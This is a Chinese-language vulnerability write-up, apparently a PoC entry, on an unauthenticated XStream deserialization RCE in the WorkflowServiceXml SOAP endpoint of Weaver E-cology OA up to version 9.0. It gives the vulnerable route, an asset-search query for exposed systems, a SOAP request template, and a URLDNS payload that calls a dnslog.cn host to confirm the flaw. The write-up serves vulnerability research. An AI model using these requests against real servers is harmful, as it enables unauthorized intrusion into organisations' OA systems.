# 泛微OA E-cology WorkflowServiceXml RCE
## 漏洞描述
泛微E-cology OA系统的WorkflowServiceXml接口可被未授权访问，攻击者调用该接口，可构造特定的HTTP请求绕过泛微本身一些安全限制从而达成远程代码执行
## 漏洞影响
```
E-cology <= 9.0
```
## 网络测绘
```
app="泛微-协同办公OA"
```
## 漏洞复现
漏洞原理来源
https://www.anquanke.com/post/id/239865
根据流量可以得知路由为`/services%20/WorkflowServiceXml`，我随即查看了该OA的web.xml。
发现了相关类为`weaver.workflow.webservices.WorkflowServiceXml`、`weaver.workflow.webservices.WorkflowServiceImplXml`。
关于类的东西先放到一旁，毕竟路由是否真实存在、`%20`有什么意义才是重点。我开始验证路由的存在。这里我测试了两个版本。
带上`%20`试试
根据这个response可以看出这应该是一个soap xml注入，具体是XMLDecoder、XStream或者其他什么，还得看`weaver.workflow.webservices.WorkflowServiceXml`、`weaver.workflow.webservices.WorkflowServiceImplXml`.
首先，先看看`weaver.workflow.webservices.WorkflowServiceXml`
可以注意到这是一个接口类，其中一个方法`doCreateWorkflowRequest`比较可疑。
去`weaver.workflow.webservices.WorkflowServiceImplXml`看看这个方法的实现。
继续跟踪看看
这个xs咋看起来这么眼熟？看看xs是个啥，一般Java可能会定义在代码文件最上方。
原来xs是`XStream`的对象
既然决定了sink点，下一步肯定是POC的撰写了，先确定SOAP基本模板。
根据朋友给的流量可以确定基本SOAP消息体模板大致是这样的。
```plain
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:web="webservices.services.weaver.com.cn">
   <soapenv:Header/>
   <soapenv:Body>
      <web:doCreateWorkflowRequest>
    <web:string></web:string>
        <web:string>2</web:string>
      </web:doCreateWorkflowRequest>
   </soapenv:Body>
</soapenv:Envelope>
```
验证成功。
接下来就是寻找gadget了。
由于并没有完整源码，只有部分github源码，不能确定gadget，先使用URLDNS试试。
```plain
<map>
  <entry>
    <url>http://1xsz12.dnslog.cn</url>
    <string>http://1xsz12.dnslog.cn</string>
  </entry>
</map>
```
组合我们的模板试试。
这里涉及到实体编码问题，作为懒人直接选择整体编码算了。
随后dnslog成功收到请求。